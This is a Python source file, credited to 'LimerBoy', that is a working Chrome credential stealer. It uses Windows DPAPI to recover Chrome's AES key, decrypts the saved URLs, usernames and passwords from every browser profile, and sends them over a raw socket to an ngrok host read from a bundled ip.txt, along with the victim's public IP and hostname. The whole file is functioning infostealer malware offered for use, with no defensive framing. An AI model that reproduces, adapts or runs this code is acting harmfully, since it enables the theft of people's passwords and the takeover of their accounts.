#Full Credits to LimerBoy
import os,re
import sys, requests, socket
import json, base64, sqlite3
import win32crypt, shutil
from Cryptodome.Cipher import AES
CHROME_PATH_LOCAL_STATE = os.path.normpath(R"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(R"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

def get_secret_key():
    try:
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        #print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome database cannot be found")
        return None
        
def getPasswords():
    try:
            urls = []
            usernames = []
            passwords = []
            secret_key = get_secret_key()
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
                chrome_path_login_db = os.path.normpath(R"%s\%s\Login Data"%(CHROME_PATH,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for login in cursor.fetchall():
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):                                                          
                            urls.append(url)
                            usernames.append(username)
                            passwords.append(decrypt_password(ciphertext, secret_key))
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
            return urls, usernames, passwords
            
    except Exception as e:
        print("[ERR] %s"%str(e))


def resourcePath(relative_path):
    if hasattr(sys, '_MEIPASS'):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def getNgrokIP():
    with open(resourcePath("ip.txt"), "r") as file:
        ngrokIP = []
        zm = file.readline()
        ngrokIP.append(zm[6:20])
        ngrokIP.append(zm[21:])
        return ngrokIP


def getPublicIP():
    response = requests.get('https://api64.ipify.org?format=json')
    data = response.json()
    return data['ip']
    
if __name__ == "__main__":
    ngrokIP = getNgrokIP()
    urls, usernames, passwords = getPasswords()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((f'{ngrokIP[0]}', int(ngrokIP[1])))
        s.send(f"{len(urls)}, {getPublicIP()}, {socket.gethostname()}".encode())
        zm = s.recv(8).decode()
        for i in range(len(urls)):
            s.send(f"{urls[i]} {usernames[i]} {passwords[i]}".encode())
            zm = s.recv(8).decode()
           

